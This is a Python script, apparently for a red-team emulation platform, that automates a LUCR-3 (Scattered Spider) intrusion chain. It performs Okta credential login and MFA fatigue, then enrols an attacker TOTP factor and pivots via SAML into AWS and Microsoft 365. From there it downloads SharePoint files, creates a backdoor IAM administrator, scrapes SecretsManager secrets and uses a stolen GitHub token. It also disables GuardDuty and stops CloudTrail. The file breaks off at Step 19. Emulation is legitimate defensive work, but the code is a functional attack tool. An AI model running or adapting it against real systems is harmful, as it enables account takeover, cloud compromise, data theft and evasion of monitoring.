# FILE: attack.py
"""
LUCR-3 (Scattered Spider) -- Automated Post-Exploitation Attack Script
Executes a 10-phase, 22-step attack chain matching the approved attack plan.

Credential chain:
  phase1_okta_creds        -> Okta username/password (env)
  phase3_okta_session      -> Okta session cookie (Step 2 MFA approval)
  phase3_aws_saml_session  -> STS temp creds via AssumeRoleWithSAML (Step 5)
  phase8_attacker_iam_key  -> Long-lived IAM key on backdoor user (Step 12)
  phase9_scraped_github_pat-> GitHub PAT from SecretsManager (Step 13)

MayaTrail backend entry point: run(outputs: dict, region: str)
"""

import sys

# Cross-platform UTF-8 output -- prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import os
import time
import random
import json

# ── Resource name resolution ─────────────────────────────────────────────────
# Static resource names not present in Pulumi exports (e.g. secret paths).
# Populated via run() if needed; defaults cover all known LUCR-3 secret paths.
_R: dict = {}


def _r(key, env_var=None, default=""):
    """Return static resource name from _R dict, with env var fallback."""
    return _R.get(key) or (os.environ.get(env_var, default) if env_var else default)
# ─────────────────────────────────────────────────────────────────────────────
import base64
import subprocess
import re
import shutil

import boto3
import requests
from botocore.exceptions import ClientError

try:
    import pyotp
    PYOTP_AVAILABLE = True
except ImportError:
    PYOTP_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False


# ============================================================
# HELPERS
# ============================================================

def print_step(msg):
    print(f"\n[*] {msg}")

def print_ok(msg):
    print(f"[+] {msg}")

def print_err(msg):
    print(f"[-] {msg}")

def print_info(msg):
    print(f"    {msg}")

def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))

def phase_delay():
    d = random.uniform(5, 15)
    print_info(f"Phase delay: {d:.1f}s")
    time.sleep(d)


def make_aws_session(access_key_id, secret_access_key, session_token=None, region="us-east-1"):
    kwargs = dict(
        aws_access_key_id=access_key_id,
        aws_secret_access_key=secret_access_key,
        region_name=region,
    )
    if session_token:
        kwargs["aws_session_token"] = session_token
    return boto3.Session(**kwargs)


def extract_saml_response(html):
    """Pull SAMLResponse value from an HTML form post page."""
    if BS4_AVAILABLE:
        soup = BeautifulSoup(html, "html.parser")
        inp = soup.find("input", {"name": "SAMLResponse"})
        if inp:
            return inp.get("value", "")
    # Regex fallback
    for pat in [
        r'name="SAMLResponse"\s+value="([^"]+)"',
        r'value="([^"]+)"\s+name="SAMLResponse"',
    ]:
        m = re.search(pat, html)
        if m:
            return m.group(1)
    return ""


# ============================================================
# PHASE 1 -- Initial IDP Compromise
# ============================================================

def phase1_okta_authn(okta_domain, username, password):
    """
    Step 1 - T1078.004: POST to /api/v1/authn with victim credentials.
    Returns (state_token, factor_id) for the MFA phase.
    """
    print_step("PHASE 1 / Step 1 - T1078.004: Okta primary authentication")
    print_info(f"Domain: {okta_domain}  User: {username}")
    print_info("Tradecraft: credential sourced from deepweb marketplace or smishing harvest")

    url = f"https://{okta_domain}/api/v1/authn"
    hdrs = {"Content-Type": "application/json", "Accept": "application/json"}

    try:
        resp = requests.post(url, json={"username": username, "password": password},
                             headers=hdrs, timeout=30)
        data = resp.json()
        status = data.get("status", "")
        print_ok(f"Okta authn status: {status}")

        if status == "MFA_REQUIRED":
            state_token = data.get("stateToken", "")
            factors = data.get("_embedded", {}).get("factors", [])
            for f in factors:
                print_info(f"  Factor: {f.get('factorType')} / {f.get('provider')} / id={f.get('id')}")

            # Prefer SMS; fall back to first available
            factor_id = None
            for f in factors:
                if f.get("factorType") == "sms":
                    factor_id = f.get("id")
                    break
            if not factor_id and factors:
                factor_id = factors[0].get("id")

            print_ok(f"stateToken: {state_token[:20]}...  factorId: {factor_id}")
            return state_token, factor_id

        elif status == "SUCCESS":
            # No MFA required -- direct session token
            session_token = data.get("sessionToken", "")
            print_ok(f"Direct sessionToken (no MFA): {session_token[:20]}...")
            return "DIRECT", session_token

        else:
            print_err(f"Unexpected authn status: {status}")
            return None, None

    except Exception as e:
        print_err(f"Okta authn failed: {e}")
        return None, None


def phase1_mfa_fatigue_and_intercept(okta_domain, state_token, factor_id, attempts=3):
    """
    Step 2 - T1621: Trigger 3 repeated MFA SMS challenges (fatigue).
    Step 3 - T1111: DOCUMENTED ONLY -- SIM swap / helpdesk reset.
    Returns sessionToken after lab operator approves on enrolled device.
    """
    print_step("PHASE 1 / Step 2 - T1621: MFA fatigue -- repeated challenge flood")
    print_info("Tradecraft: flood victim device until accidental approval")
    print_info("Emulation: lab operator holds enrolled test device and approves")

    url = f"https://{okta_domain}/api/v1/authn/factors/{factor_id}/verify"
    hdrs = {"Content-Type": "application/json", "Accept": "application/json"}
    body = {"stateToken": state_token}

    for i in range(attempts):
        print_info(f"MFA challenge {i+1}/{attempts}")
        try:
            resp = requests.post(url, json=body, headers=hdrs, timeout=30)
            status = resp.json().get("status", "")
            print_info(f"  Response status: {status}")
        except Exception as e:
            print_err(f"MFA challenge {i+1} error: {e}")
        op_delay(10, 30)

    # ------------------------------------------------------------------
    # Step 3 - T1111: Multi-Factor Authentication Interception
    # DOCUMENTED ONLY -- NOT IMPLEMENTED IN ATTACK SCRIPT
    # ------------------------------------------------------------------
    print_step("PHASE 1 / Step 3 - T1111: MFA Interception [DOCUMENTED ONLY - NO CODE]")
    print_info("=" * 60)
    print_info("TECHNIQUE: T1111 - Multi-Factor Authentication Interception")
    print_info("REAL LUCR-3 ACTION:")
    print_info("  Option A: SIM swap -- calls victim carrier, impersonates victim,")
    print_info("    ports phone number to attacker SIM. All SMS OTPs delivered to attacker.")
    print_info("  Option B: Helpdesk reset -- calls Okta/IT helpdesk claiming lost device,")
    print_info("    social engineers MFA reset, then re-enrolls attacker device.")
    print_info("EXPECTED OUTCOME: sessionToken from Okta after OTP successfully intercepted.")
    print_info("EMULATION NOTE: Lab operator manually approves MFA on enrolled test device.")
    print_info("  SIM swapping is illegal telecom fraud -- not implemented per safety rules.")
    print_info("=" * 60)

    print_step("ACTION REQUIRED: Approve the MFA challenge on the enrolled test device.")
    print_info("Press ENTER after approving to continue...")
    try:
        input()
    except EOFError:
        pass  # Non-interactive mode

    # Poll for sessionToken after operator approval
    try:
        resp = requests.post(url, json=body, headers=hdrs, timeout=30)
        data = resp.json()
        if data.get("status") == "SUCCESS":
            session_token = data.get("sessionToken", "")
            print_ok(f"sessionToken obtained: {session_token[:20]}...")
            return session_token
        else:
            print_err(f"Post-approval status: {data.get('status')} -- trying stateToken field")
            return data.get("sessionToken", "")
    except Exception as e:
        print_err(f"Post-approval poll failed: {e}")
        return ""


# ============================================================
# PHASE 2 -- IDP Persistence via Device Registration
# ============================================================

def phase2_enroll_attacker_device(okta_domain, session_token):
    """
    Step 4 - T1098.005: Exchange sessionToken for session cookie; enroll attacker TOTP device.
    Returns (session_id, user_id, enrolled_factor_id, totp_secret).
    """
    print_step("PHASE 2 / Step 4 - T1098.005: Enroll attacker-controlled TOTP factor")
    print_info("Tradecraft: attacker registers own authenticator -- survives victim password reset")

    hdrs = {"Content-Type": "application/json", "Accept": "application/json"}

    # 4.1: Exchange sessionToken for session cookie
    print_info("4.1: POST /api/v1/sessions -- exchange sessionToken")
    session_id = ""
    try:
        resp = requests.post(
            f"https://{okta_domain}/api/v1/sessions",
            json={"sessionToken": session_token},
            headers=hdrs, timeout=30
        )
        session_id = resp.json().get("id", "")
        print_ok(f"Okta session id: {session_id[:20]}...")
    except Exception as e:
        print_err(f"Session exchange failed: {e}")
        return None, None, None, None

    op_delay()

    okta_sess = requests.Session()
    okta_sess.cookies.set("sid", session_id, domain=okta_domain)
    okta_sess.headers.update(hdrs)

    # 4.2: Get victim userId
    print_info("4.2: GET /api/v1/users/me")
    user_id = ""
    try:
        resp = okta_sess.get(f"https://{okta_domain}/api/v1/users/me", timeout=30)
        user_data = resp.json()
        user_id = user_data.get("id", "")
        login = user_data.get("profile", {}).get("login", "")
        print_ok(f"userId: {user_id}  login: {login}")
    except Exception as e:
        print_err(f"Get /users/me failed: {e}")
        return session_id, None, None, None

    op_delay()

    # 4.3: Enroll TOTP factor
    print_info("4.3: POST /api/v1/users/{userId}/factors -- enroll TOTP")
    new_factor_id = ""
    totp_secret = ""
    try:
        resp = okta_sess.post(
            f"https://{okta_domain}/api/v1/users/{user_id}/factors",
            json={"factorType": "token:software:totp", "provider": "GOOGLE"},
            timeout=30
        )
        fdata = resp.json()
        new_factor_id = fdata.get("id", "")
        totp_secret = (
            fdata.get("_embedded", {}).get("activation", {}).get("sharedSecret", "")
        )
        print_ok(f"TOTP factor id: {new_factor_id}")
        print_ok(f"TOTP shared secret: {totp_secret}")
    except Exception as e:
        print_err(f"Factor enrollment failed: {e}")
        return session_id, user_id, None, None

    op_delay()

    # 4.4: Activate with TOTP code
    if totp_secret and PYOTP_AVAILABLE:
        totp_code = pyotp.TOTP(totp_secret).now()
        print_info(f"4.4: Activating with TOTP code: {totp_code}")
        try:
            resp = okta_sess.post(
                f"https://{okta_domain}/api/v1/users/{user_id}/factors/{new_factor_id}/lifecycle/activate",
                json={"passCode": totp_code},
                timeout=30
            )
            print_ok(f"Factor activation status: {resp.json().get('status', resp.status_code)}")
        except Exception as e:
            print_err(f"Factor activation failed: {e}")
    elif totp_secret:
        print_err("pyotp not installed -- factor activation skipped (install: pip install pyotp)")
    else:
        print_err("No TOTP secret -- activation skipped")

    return session_id, user_id, new_factor_id, totp_secret


# ============================================================
# PHASE 3 -- Cloud Pivot via SAML Federation
# ============================================================

def phase3_saml_pivot_aws(okta_domain, session_id, okta_aws_app_id,
                           federated_role_arn, saml_provider_arn):
    """
    Step 5 - T1078.004: GET Okta SAML app embed URL, parse SAMLResponse,
    call sts:AssumeRoleWithSAML. Returns (key_id, secret, token).
    """
    print_step("PHASE 3 / Step 5 - T1078.004: SAML pivot from Okta IDP into AWS STS")
    print_info(f"Role: {federated_role_arn}")
    print_info(f"SAML provider: {saml_provider_arn}")
    print_info("Tradecraft: federated trust abused to land in AWS with near-admin rights")

    okta_sess = requests.Session()
    okta_sess.cookies.set("sid", session_id, domain=okta_domain)

    # 5.1: Fetch SAML SSO page
    sso_url = f"https://{okta_domain}/app/amazon_aws/{okta_aws_app_id}/sso/saml"
    print_info(f"5.1: GET {sso_url}")
    try:
        resp = okta_sess.get(sso_url, timeout=30, allow_redirects=True)
        saml_b64 = extract_saml_response(resp.text)
        if saml_b64:
            print_ok(f"SAMLResponse extracted ({len(saml_b64)} chars)")
        else:
            print_err("SAMLResponse not found -- check okta_aws_app_id and session cookie")
            return None, None, None
    except Exception as e:
        print_err(f"SAML SSO fetch failed: {e}")
        return None, None, None

    op_delay()

    # 5.2: AssumeRoleWithSAML
    print_info("5.2: sts:AssumeRoleWithSAML")
    try:
        sts = boto3.client("sts", region_name="us-east-1")
        resp = sts.assume_role_with_saml(
            RoleArn=federated_role_arn,
            PrincipalArn=saml_provider_arn,
            SAMLAssertion=saml_b64,
        )
        c = resp["Credentials"]
        print_ok(f"AWS creds obtained: KeyId={c['AccessKeyId']}  Expires={c['Expiration']}")
        return c["AccessKeyId"], c["SecretAccessKey"], c["SessionToken"]
    except ClientError as e:
        print_err(f"AssumeRoleWithSAML failed: {e}")
        return None, None, None


# ============================================================
# PHASE 4 -- SaaS Collection via Federated M365
# ============================================================

def phase4_m365_sharepoint(okta_domain, session_id, okta_azuread_app_id, m365_tenant_id):
    """
    Step 6 - T1213.002: Federate into Azure AD via SAML, enumerate/download SharePoint docs.
    Returns graph_access_token for later mailbox cleanup.
    """
    print_step("PHASE 4 / Step 6 - T1213.002: Federated M365 SharePoint collection")
    print_info(f"AzureAD app: {okta_azuread_app_id}  Tenant: {m365_tenant_id}")
    print_info("Tradecraft: Okta -> AzureAD SAML federation -> Graph API for corporate IP theft")

    okta_sess = requests.Session()
    okta_sess.cookies.set("sid", session_id, domain=okta_domain)

    # 6.1: Okta SAML assertion for AzureAD app
    sso_url = f"https://{okta_domain}/app/office365/{okta_azuread_app_id}/sso/saml"
    print_info(f"6.1: GET {sso_url}")
    saml_b64 = ""
    try:
        resp = okta_sess.get(sso_url, timeout=30, allow_redirects=True)
        saml_b64 = extract_saml_response(resp.text)
        if saml_b64:
            print_ok(f"AzureAD SAMLResponse extracted ({len(saml_b64)} chars)")
        else:
            print_err("AzureAD SAMLResponse not found")
    except Exception as e:
        print_err(f"AzureAD SAML SSO failed: {e}")

    op_delay()

    # 6.2: Exchange SAML assertion for Graph access token
    graph_token = ""
    if saml_b64 and m365_tenant_id:
        print_info("6.2: POST to MS token endpoint -- SAML bearer grant")
        token_url = f"https://login.microsoftonline.com/{m365_tenant_id}/oauth2/v2.0/token"
        m365_client_id = os.environ.get("M365_CLIENT_ID", "")
        body = {
            "grant_type": "urn:ietf:params:oauth:grant-type:saml2-bearer",
            "assertion": base64.b64encode(saml_b64.encode()).decode(),
            "scope": "https://graph.microsoft.com/.default",
            "client_id": m365_client_id,
        }
        try:
            resp = requests.post(token_url, data=body, timeout=30)
            tdata = resp.json()
            graph_token = tdata.get("access_token", "")
            if graph_token:
                print_ok(f"Graph token: {graph_token[:30]}...")
            else:
                print_err(f"Graph token exchange failed: {tdata.get('error_description', tdata)}")
        except Exception as e:
            print_err(f"Graph token request failed: {e}")
    else:
        print_err("Missing SAML response or tenant_id -- Graph token skipped")

    if not graph_token:
        return None

    gh = {"Authorization": f"Bearer {graph_token}", "Accept": "application/json"}

    op_delay()

    # 6.3: Enumerate SharePoint sites
    print_info("6.3: GET /sites?search=corporate")
    sites = []
    try:
        resp = requests.get("https://graph.microsoft.com/v1.0/sites?search=corporate",
                            headers=gh, timeout=30)
        sites = resp.json().get("value", [])
        print_ok(f"SharePoint sites: {len(sites)}")
        for s in sites[:5]:
            print_info(f"  {s.get('displayName')} -- {s.get('webUrl')}")
    except Exception as e:
        print_err(f"SharePoint site enum failed: {e}")

    op_delay()

    # 6.4+6.5: List and download up to 5 files from first 2 sites
    for site in sites[:2]:
        site_id = site.get("id", "")
        site_name = site.get("displayName", "unknown")
        if not site_id:
            continue
        print_info(f"6.4: List drive root for site: {site_name}")
        try:
            resp = requests.get(
                f"https://graph.microsoft.com/v1.0/sites/{site_id}/drive/root/children",
                headers=gh, timeout=30
            )
            items = resp.json().get("value", [])
            print_ok(f"Items in {site_name}: {len(items)}")
            count = 0
            for item in items:
                if count >= 5:
                    break
                item_id = item.get("id", "")
                item_name = item.get("name", "")
                if not item_id or item.get("folder"):
                    continue
                print_info(f"  6.5: Downloading: {item_name}")
                try:
                    dl = requests.get(
                        f"https://graph.microsoft.com/v1.0/sites/{site_id}/drive/items/{item_id}/content",
                        headers=gh, timeout=30, allow_redirects=True
                    )
                    if dl.status_code == 200:
                        print_ok(f"  Downloaded {item_name} ({len(dl.content)} bytes)")
                        count += 1
                    else:
                        print_err(f"  Download {item_name}: HTTP {dl.status_code}")
                except Exception as de:
                    print_err(f"  Download error {item_name}: {de}")
                op_delay(1, 3)
        except Exception as e:
            print_err(f"Drive root list failed for {site_name}: {e}")

    return graph_token


# ============================================================
# PHASE 5 -- AWS Discovery
# ============================================================

def phase5_aws_discovery(aws_sess, s3_corporate_bucket, s3_engineering_bucket):
    """
    Steps 7, 8, 9 - T1580, T1619, T1082: Enumerate account identity, IAM, EC2,
    DynamoDB, S3, VPC, SSM. Returns list of SSM-managed instance IDs.
    """
    region = aws_sess.region_name or "us-east-1"
    sts     = aws_sess.client("sts",      region_name=region)
    iam     = aws_sess.client("iam",      region_name=region)
    ec2     = aws_sess.client("ec2",      region_name=region)
    ddb     = aws_sess.client("dynamodb", region_name=region)
    s3      = aws_sess.client("s3",       region_name=region)
    ssm     = aws_sess.client("ssm",      region_name=region)

    # Step 7 - T1580
    print_step("PHASE 5 / Step 7 - T1580: Cloud infrastructure discovery")
    print_info("Tradecraft: map blast radius via enumeration equivalent to CloudShell usage")

    try:
        idn = sts.get_caller_identity()
        print_ok(f"GetCallerIdentity: Account={idn['Account']}  ARN={idn['Arn']}")
    except ClientError as e:
        print_err(f"GetCallerIdentity: {e}")

    op_delay()

    try:
        users = iam.list_users().get("Users", [])
        print_ok(f"ListUsers: {len(users)} users")
        for u in users[:5]:
            print_info(f"  {u['UserName']}")
    except ClientError as e:
        print_err(f"ListUsers: {e}")

    op_delay()

    try:
        roles = iam.list_roles().get("Roles", [])
        print_ok(f"ListRoles: {len(roles)} roles")
        for r in roles[:5]:
            print_info(f"  {r['RoleName']}")
    except ClientError as e:
        print_err(f"ListRoles: {e}")

    op_delay()

    try:
        rsvs = ec2.describe_instances(
            Filters=[{"Name": "instance-state-name", "Values": ["running"]}]
        ).get("Reservations", [])
        count = sum(len(r.get("Instances", [])) for r in rsvs)
        print_ok(f"DescribeInstances: {count} running")
        for r in rsvs:
            for inst in r.get("Instances", []):
                tags = {t["Key"]: t["Value"] for t in inst.get("Tags", [])}
                print_info(f"  {inst['InstanceId']} / {tags.get('Name','unnamed')}")
    except ClientError as e:
        print_err(f"DescribeInstances: {e}")

    op_delay()

    try:
        tables = ddb.list_tables().get("TableNames", [])
        print_ok(f"ListTables: {len(tables)} tables")
        for t in tables:
            print_info(f"  {t}")
    except ClientError as e:
        print_err(f"ListTables: {e}")

    op_delay(3, 8)

    # Step 8 - T1619
    print_step("PHASE 5 / Step 8 - T1619: Cloud storage object discovery")
    print_info("Tradecraft: scan for terraform.tfstate and credential-bearing files")

    try:
        buckets = s3.list_buckets().get("Buckets", [])
        print_ok(f"ListBuckets: {len(buckets)}")
        for b in buckets:
            print_info(f"  {b['Name']}")
    except ClientError as e:
        print_err(f"ListBuckets: {e}")

    op_delay()

    for bkt in [s3_corporate_bucket, s3_engineering_bucket]:
        if not bkt:
            continue
        try:
            objs = s3.list_objects_v2(Bucket=bkt).get("Contents", [])
            print_ok(f"ListObjects({bkt}): {len(objs)} objects")
            for o in objs[:10]:
                print_info(f"  {o['Key']} ({o['Size']} bytes)")
        except ClientError as e:
            print_err(f"ListObjects({bkt}): {e}")
        op_delay()

    op_delay(3, 8)

    # Step 9 - T1082
    print_step("PHASE 5 / Step 9 - T1082: System information discovery (VPC + SSM)")
    print_info("Tradecraft: identify SSM-managed instances for lateral movement")

    try:
        vpcs = ec2.describe_vpcs().get("Vpcs", [])
        print_ok(f"DescribeVpcs: {len(vpcs)}")
        for v in vpcs:
            tags = {t["Key"]: t["Value"] for t in v.get("Tags", [])}
            print_info(f"  {v['VpcId']} CIDR={v['CidrBlock']} Name={tags.get('Name','')}")
    except ClientError as e:
        print_err(f"DescribeVpcs: {e}")

    op_delay()

    try:
        subnets = ec2.describe_subnets().get("Subnets", [])
        print_ok(f"DescribeSubnets: {len(subnets)}")
    except ClientError as e:
        print_err(f"DescribeSubnets: {e}")

    op_delay()

    try:
        kps = ec2.describe_key_pairs().get("KeyPairs", [])
        print_ok(f"DescribeKeyPairs: {len(kps)}")
        for kp in kps:
            print_info(f"  {kp['KeyName']}")
    except ClientError as e:
        print_err(f"DescribeKeyPairs: {e}")

    op_delay()

    ssm_instance_ids = []
    try:
        insts = ssm.describe_instance_information().get("InstanceInformationList", [])
        print_ok(f"DescribeInstanceInformation: {len(insts)} SSM-managed instances")
        for i in insts:
            print_info(f"  {i.get('InstanceId')} / {i.get('PingStatus')}")
            ssm_instance_ids.append(i.get("InstanceId", ""))
    except ClientError as e:
        print_err(f"DescribeInstanceInformation: {e}")

    return ssm_instance_ids


# ============================================================
# PHASE 6 -- AWS Backdoor and Persistence
# ============================================================

def phase6_aws_backdoor(aws_sess, backdoor_username):
    """
    Steps 10, 11, 12 - T1136.003, T1098, T1098.001: Create backdoor IAM user,
    attach AdministratorAccess, generate long-lived access key.
    Returns (key_id, secret).
    """
    print_step("PHASE 6 / Steps 10-12 - T1136.003+T1098+T1098.001: IAM backdoor persistence")
    print_info(f"Backdoor username: {backdoor_username}")
    print_info("Tradecraft: durable IAM credential survives IDP session revocation")

    region = aws_sess.region_name or "us-east-1"
    iam = aws_sess.client("iam", region_name=region)

    # Step 10: CreateUser
    print_step(f"PHASE 6 / Step 10 - T1136.003: iam:CreateUser {backdoor_username}")
    try:
        iam.create_user(UserName=backdoor_username)
        print_ok(f"CreateUser: {backdoor_username}")
    except ClientError as e:
        if e.response["Error"]["Code"] == "EntityAlreadyExists":
            print_ok(f"User {backdoor_username} already exists -- continuing")
        else:
            print_err(f"CreateUser failed: {e}")
            return None, None

    op_delay()

    try:
        iam.create_login_profile(
            UserName=backdoor_username,
            Password="Emulat10n!Backdoor#2026",
            PasswordResetRequired=False,
        )
        print_ok(f"CreateLoginProfile: {backdoor_username}")
    except ClientError as e:
        if e.response["Error"]["Code"] == "EntityAlreadyExists":
            print_ok("Login profile already exists")
        else:
            print_err(f"CreateLoginProfile: {e}")

    op_delay()

    # Step 11: AttachUserPolicy AdministratorAccess
    print_step(f"PHASE 6 / Step 11 - T1098: AttachUserPolicy AdministratorAccess -> {backdoor_username}")
    print_info("Tradecraft: broadest managed policy maximizes attacker blast radius")
    try:
        iam.attach_user_policy(
            UserName=backdoor_username,
            PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",
        )
        print_ok("AttachUserPolicy: AdministratorAccess attached")
    except ClientError as e:
        print_err(f"AttachUserPolicy: {e}")

    op_delay()

    # Step 12: CreateAccessKey (with 2-key quota guard)
    print_step(f"PHASE 6 / Step 12 - T1098.001: CreateAccessKey for {backdoor_username}")
    print_info("Tradecraft: non-expiring key persists after SAML federation is revoked")

    try:
        existing = iam.list_access_keys(UserName=backdoor_username)["AccessKeyMetadata"]
        if len(existing) >= 2:
            newest = max(existing, key=lambda k: k["CreateDate"])
            try:
                iam.delete_access_key(UserName=backdoor_username,
                                      AccessKeyId=newest["AccessKeyId"])
                print_ok(f"Pre-rotate: deleted stale key {newest['AccessKeyId']} (at 2-key quota)")
            except ClientError as de:
                print_err(f"Pre-rotate delete failed: {de}")
    except ClientError as e:
        print_err(f"ListAccessKeys pre-check: {e}")

    op_delay()

    try:
        resp = iam.create_access_key(UserName=backdoor_username)
        key = resp["AccessKey"]
        print_ok(f"CreateAccessKey: {key['AccessKeyId']}")
        return key["AccessKeyId"], key["SecretAccessKey"]
    except ClientError as e:
        print_err(f"CreateAccessKey: {e}")
        return None, None


# ============================================================
# PHASE 7 -- Credential Harvest and Compute Staging
# ============================================================

def phase7_harvest_and_stage(attacker_sess, subnet_id, sg_id):
    """
    Steps 13, 14 - T1555.006, T1578.002: Scrape SecretsManager; launch staging EC2.
    Returns (github_pat, launched_instance_id, instance_profile_name).
    """
    region = attacker_sess.region_name or "us-east-1"
    sm  = attacker_sess.client("secretsmanager", region_name=region)
    iam = attacker_sess.client("iam",             region_name=region)
    ec2 = attacker_sess.client("ec2",             region_name=region)

    # Step 13 - T1555.006
    print_step("PHASE 7 / Step 13 - T1555.006: Enumerate and harvest SecretsManager")
    print_info("Tradecraft: CloudShell-equivalent scraping for lateral movement credentials")
    print_info("NOTE: bait/canary secrets trigger independent detection alerts on access")

    github_pat = ""

    try:
        secrets = sm.list_secrets().get("SecretList", [])
        print_ok(f"ListSecrets: {len(secrets)} secrets")
        for s in secrets:
            print_info(f"  {s['Name']}")
    except ClientError as e:
        print_err(f"ListSecrets: {e}")

    op_delay()

    for secret_id in [
        _r("secret_prod_db",         default="prod/database/master_credentials"),
        _r("secret_stripe",          default="prod/payments/stripe_secret_key"),
        _r("secret_honey_creds",     default="prod/infrastructure/terraform-automation-key"),
        _r("secret_github_pat",      default="prod/cicd/github-actions-token"),
    ]:
        try:
            val = sm.get_secret_value(SecretId=secret_id).get("SecretString", "")
            print_ok(f"GetSecretValue({secret_id}): {val[:80]}...")
            if "github" in secret_id.lower() or "github" in val.lower():
                try:
                    parsed = json.loads(val)
                    github_pat = parsed.get("token", "")
                    if github_pat:
                        print_ok(f"GitHub PAT extracted: {github_pat[:20]}...")
                except Exception:
                    pass
            if "bait" in secret_id.lower() or "honey" in secret_id.lower():
                print_info("  CANARY: this access triggers an independent detection alert")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            print_err(f"GetSecretValue({secret_id}) [{code}]: {e.response['Error']['Message']}")
        op_delay()

    op_delay(5, 15)

    # Step 14 - T1578.002
    print_step("PHASE 7 / Step 14 - T1578.002: Launch attacker EC2 staging instance")
    print_info("Tradecraft: EC2 used to stage bulk exfiltration before external transfer")

    profile_name = "lucr3-attack-instance-profile"
    launched_id = None

    try:
        iam.create_instance_profile(InstanceProfileName=profile_name)
        print_ok(f"CreateInstanceProfile: {profile_name}")
    except ClientError as e:
        if e.response["Error"]["Code"] == "EntityAlreadyExists":
            print_ok(f"Instance profile {profile_name} already exists")
        else:
            print_err(f"CreateInstanceProfile: {e}")

    op_delay()

    if subnet_id and sg_id:
        try:
            resp = ec2.run_instances(
                ImageId="resolve:ssm:/aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64",
                InstanceType="t3.micro",
                MinCount=1,
                MaxCount=1,
                SubnetId=subnet_id,
                SecurityGroupIds=[sg_id],
                IamInstanceProfile={"Name": profile_name},
                TagSpecifications=[{
                    "ResourceType": "instance",
                    "Tags": [{"Key": "Name", "Value": "lucr3-attack-host"}],
                }],
            )
            launched_id = resp["Instances"][0]["InstanceId"]
            print_ok(f"RunInstances: {launched_id} (lucr3-attack-host)")
        except ClientError as e:
            print_err(f"RunInstances: {e}")
    else:
        print_err("subnet_id or sg_id missing -- RunInstances skipped")

    return github_pat, launched_id, profile_name


# ============================================================
# PHASE 8 -- Defense Evasion
# ============================================================

def phase8_defense_evasion(attacker_sess, github_pat, trail_name):
    """
    Steps 15, 16, 17 - T1550.001, T1562.001, T1562.008.
    Returns detector_id (needed for cleanup).
    """
    region = attacker_sess.region_name or "us-east-1"
    gd = attacker_sess.client("guardduty",  region_name=region)
    ct = attacker_sess.client("cloudtrail", region_name=region)
    detector_id = None

    # Step 15 - T1550.001: Use stolen GitHub PAT
    print_step("PHASE 8 / Step 15 - T1550.001: Use stolen GitHub PAT as Application Access Token")
    print_info("Tradecraft: stolen CI/CD token pivots attacker into code repositories")
    print_info("NOTE: bait PAT is revoked -- 401 expected; attempt still generates GitHub Audit Log event")

    if github_pat:
        gh_hdrs = {
            "Authorization": f"Bearer {github_pat}",
            "Accept": "application/vnd.github+json",
        }
        for endpoint in ["https://api.github.com/user", "https://api.github.com/user/repos"]:
            try:
                resp = requests.get(endpoint, headers=gh_hdrs, timeout=30)
                if resp.status_code == 200:
                    print_ok(f"GitHub {endpoint}: 200 OK (token valid)")
                elif resp.status_code == 401:
                    print_ok(f"GitHub {endpoint}: 401 (expected -- bait token revoked; canary triggered)")
                else:
                    print_err(f"GitHub {endpoint}: HTTP {resp.status_code}")
            except Exception as e:
                print_err(f"GitHub request failed: {e}")
            op_delay(2, 5)
    else:
        print_err("No GitHub PAT -- Step 15 skipped")

    op_delay(3, 10)

    # Step 16 - T1562.001: Disable GuardDuty
    print_step("PHASE 8 / Step 16 - T1562.001: Disable GuardDuty detector")
    print_info("Tradecraft: UpdateDetector (not DeleteDetector) is less conspicuous")
    print_info("Observed LUCR-3 pattern: disable GD immediately before bulk S3 exfiltration")

    try:
        det_ids = gd.list_detectors().get("DetectorIds", [])
        print_ok(f"ListDetectors: {det_ids}")
        if det_ids:
            detector_id = det_ids[0]
            gd.update_detector(DetectorId=detector_id, Enable=False)
            print_ok(f"UpdateDetector({detector_id}, Enable=False) -- GuardDuty disabled")
        else:
            print_err("No GuardDuty detectors found")
    except ClientError as e:
        print_err(f"GuardDuty disable: {e}")

    op_delay(2, 6)

    # Step 17 - T1562.008: Stop CloudTrail
    print_step("PHASE 8 / Step 17 - T1562.008: Stop CloudTrail logging")
    print_info(f"Trail: {trail_name}")
    print_info("FORENSIC NOTE: StopLogging is the last event before the forensic gap")
    print_info("Steps 18-22 API calls will NOT appear in CloudTrail")

    try:
        st = ct.get_trail_status(Name=trail_name)
        print_info(f"Trail currently logging: {st.get('IsLogging')}")
    except ClientError as e:
        print_err(f"GetTrailStatus: {e}")

    op_delay()

    try:
        ct.stop_logging(Name=trail_name)
        print_ok(f"StopLogging({trail_name}) -- CloudTrail stopped")
    except ClientError as e:
        print_err(f"StopLogging: {e}")

    return detector_id


# ============================================================
# PHASE 9 -- Lateral Movement and Artifact Removal
# ============================================================

def phase9_lateral_and_cleanup(attacker_sess, ec2_target_id, graph_token):
    """
    Steps 18, 19 (doc-only), 20 - T1021.004, T1072, T1070.008.
    SSM session, SCCM documentation stub, M365 mailbox clearing.
    """
    region = attacker_sess.region_name or "us-east-1"
    ssm = attacker_sess.client("ssm", region_name=region)

    # Step 18 - T1021.004: SSM lateral movement
    print_step("PHASE 9 / Step 18 - T1021.004: Lateral movement via AWS SSM Session Manager")
    print_info(f"Target: {ec2_target_id}")
    print_info("Tradecraft: SSM tunnel bypasses need for exposed SSH port -- AWS-native LUCR-3 pattern")

    if ec2_target_id:
        try:
            resp = ssm.start_session(
                Target=ec2_target_id,
                DocumentName="AWS-StartSSHSession",
                Parameters={"portNumber": ["22"]},
            )
            sess_id = resp.get("SessionId", "")
            stream_url = resp.get("StreamUrl", "")
            print_ok(f"SSM StartSession: SessionId={sess_id}")
            print_info(f"StreamUrl: {stream_url[:60]}...")
            op_delay(2, 5)
            try:
                ssm.terminate_session(SessionId=sess_id)
                print_ok(f"SSM session {sess_id} terminated")
            except ClientError as e:
                print_err(f"TerminateSession: {e}")
        except ClientError as e:
            print_err(f"SSM StartSession: {e}")
    else:
        print_err("No EC2 target instance id -- SSM lateral movement skipped")

    op_delay(3, 8)

    # Step 19 - T1072: DOCUMENTED ONLY
